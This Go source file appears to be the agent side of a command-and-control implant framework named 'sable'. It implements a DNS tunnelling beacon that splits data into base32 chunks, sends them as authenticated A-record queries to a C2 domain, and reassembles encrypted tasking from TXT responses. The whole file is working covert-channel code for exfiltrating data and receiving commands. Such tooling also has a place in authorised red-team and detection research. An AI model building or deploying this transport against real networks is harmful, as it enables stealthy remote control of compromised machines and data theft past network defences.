package agent

import (
	"crypto/rand"
	"encoding/base32"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/aelder202/sable/internal/protocol"
	mdns "github.com/miekg/dns"
)

const (
	agentDNSChunkSize    = 30   // must match server-side ChunkForDNS chunk size
	agentDNSUDPSize      = 4096 // enough for encrypted task TXT responses
	maxDNSBeaconBytes    = 15 * 1024
	maxDNSResponseChunks = 128
)

var errDNSBeaconTooLarge = errors.New("encoded beacon exceeds DNS transport limit")

// sendBeaconDNS transmits an encoded beacon over DNS and returns the server's encrypted response.
// Each chunk is base32-encoded and sent as a DNS A-record query.
// The server responds with the task in a TXT record on the final chunk.
func sendBeaconDNS(encoded []byte, c2Domain, agentID string, secret []byte) ([]byte, error) {
	if len(encoded) > maxDNSBeaconBytes {
		return nil, fmt.Errorf("%w (%d > %d bytes)", errDNSBeaconTooLarge, len(encoded), maxDNSBeaconBytes)
	}
	chunks := chunkData(encoded)
	total := len(chunks)
	if total == 0 {
		return nil, fmt.Errorf("empty beacon payload")
	}

	domain := strings.TrimSuffix(c2Domain, ".")
	// Derive server address from domain. Send queries to port 53 of the C2 domain.
	serverAddr := net.JoinHostPort(domain, "53")

	client := &mdns.Client{Net: "udp", Timeout: 5 * time.Second, UDPSize: agentDNSUDPSize}
	sessionID, err := dnsSessionID()
	if err != nil {
		return nil, fmt.Errorf("generate DNS session ID: %w", err)
	}

	var firstResponse *mdns.Msg
	for i, chunk := range chunks {
		b32 := strings.ToLower(
			base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk),
		)
		// Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<authTag>.<domain>.
		authTag := protocol.DNSChunkAuthTag(secret, sessionID, agentID, i, total, chunk)
		qname := fmt.Sprintf("%s.%04d.%04d.%s.%s.%s.%s.", b32, i, total, sessionID, agentID, authTag, domain)

		msg := new(mdns.Msg)
		msg.SetQuestion(qname, mdns.TypeA)
		msg.SetEdns0(agentDNSUDPSize, false)
		msg.RecursionDesired = false

		resp, _, err := client.Exchange(msg, serverAddr)
		if err != nil {
			return nil, fmt.Errorf("DNS exchange chunk %d: %w", i, err)
		}

		// The final chunk carries the hex-encoded TXT response.
		if i == total-1 {
			firstResponse = resp
		}
	}

	first, totalResponses, err := decodeDNSResponse(firstResponse)
	if err != nil {
		// The completed beacon response may have been lost. The server retains
		// response chunks briefly, so retry chunk zero without replaying it.
		first, totalResponses, err = retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, agentID, secret, 0)
		if err != nil {
			return nil, err
		}
	}
	if totalResponses < 1 || totalResponses > maxDNSResponseChunks {
		return nil, fmt.Errorf("invalid DNS response chunk count %d", totalResponses)
	}
	respBytes := append([]byte(nil), first...)
	for index := 1; index < totalResponses; index++ {
		chunk, chunkTotal, err := retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, agentID, secret, index)
		if err != nil {
			return nil, err
		}
		if chunkTotal != totalResponses {
			return nil, fmt.Errorf("DNS response chunk count changed")
		}
		respBytes = append(respBytes, chunk...)
	}
	return respBytes, nil
}

func retrieveDNSResponseChunk(client *mdns.Client, serverAddr, domain, sessionID, agentID string, secret []byte, index int) ([]byte, int, error) {
	authTag := protocol.DNSResponseAuthTag(secret, sessionID, agentID, index)
	qname := fmt.Sprintf("r.%04d.%s.%s.%s.%s.", index, sessionID, agentID, authTag, domain)
	msg := new(mdns.Msg)
	msg.SetQuestion(qname, mdns.TypeTXT)
	msg.SetEdns0(agentDNSUDPSize, false)
	msg.RecursionDesired = false
	resp, _, err := client.Exchange(msg, serverAddr)
	if err != nil {
		return nil, 0, fmt.Errorf("retrieve DNS response chunk %d: %w", index, err)
	}
	return decodeDNSResponse(resp)
}

func decodeDNSResponse(resp *mdns.Msg) ([]byte, int, error) {
	if resp == nil {
		return nil, 0, errors.New("no DNS response received")
	}
	for _, rr := range resp.Answer {
		txt, ok := rr.(*mdns.TXT)
		if !ok {
			continue
		}
		payload := strings.Join(txt.Txt, "")
		total := 1
		if strings.HasPrefix(payload, "v1:") {
			parts := strings.SplitN(payload, ":", 4)
			if len(parts) != 4 {
				return nil, 0, errors.New("invalid DNS response frame")
			}
			parsed, err := strconv.Atoi(parts[1])
			if err != nil {
				return nil, 0, errors.New("invalid DNS response chunk count")
			}
			total = parsed
			payload = parts[3]
		}
		decoded, err := hex.DecodeString(payload)
		if err != nil {
			return nil, 0, fmt.Errorf("decode DNS response: %w", err)
		}
		return decoded, total, nil
	}
	return nil, 0, errors.New("no TXT response received from DNS server")
}

// chunkData splits data into agentDNSChunkSize-byte chunks.
func chunkData(data []byte) [][]byte {
	var chunks [][]byte
	for len(data) > 0 {
		n := agentDNSChunkSize
		if n > len(data) {
			n = len(data)
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	return chunks
}

func dnsSessionID() (string, error) {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}
